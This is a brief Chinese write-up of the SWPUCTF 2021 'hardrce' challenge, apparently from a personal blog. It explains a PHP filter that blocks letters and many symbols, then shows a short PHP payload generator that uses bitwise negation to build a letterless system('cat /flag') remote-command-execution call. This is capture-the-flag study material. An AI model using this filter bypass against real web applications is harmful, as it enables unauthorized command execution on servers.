# 【SWPUCTF 2021 新生赛】hardrce


# [SWPUCTF 2021 新生赛]hardrce

## 思路
* GET传参给网页（参数是wllm）
* 过滤1【一些符号】：`$blacklist = [&#39; &#39;,&#39;\t&#39;,&#39;\r&#39;,&#39;\n&#39;,&#39;\&#43;&#39;,&#39;\[&#39;,&#39;\^&#39;,&#39;\]&#39;,&#39;\&#34;&#39;,&#39;\-&#39;,&#39;\$&#39;,&#39;\*&#39;,&#39;\?&#39;,&#39;\&lt;&#39;,&#39;\&gt;&#39;,&#39;\=&#39;,&#39;\`&#39;,];`
* 过滤2【字母】：preg_match(&#39;/[a-zA-Z]/is&#39;,$wllm)
* 因此考虑无字母绕过中的取反绕过

## EXP

取反绕过核心代码

```
&lt;?php
echo urlencode(~&#39;system&#39;);
echo &#34;\n&#34;;
echo urlencode(~&#39;cat /flllllaaaaaaggggggg&#39;);
?&gt;

# 构造system(cat /flllllaaaaaaggggggg);
# 其中把system和cat /flllllaaaaaaggggggg替换
```




## 总结
* 无字母RCE——取反绕过

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bhardrce/  

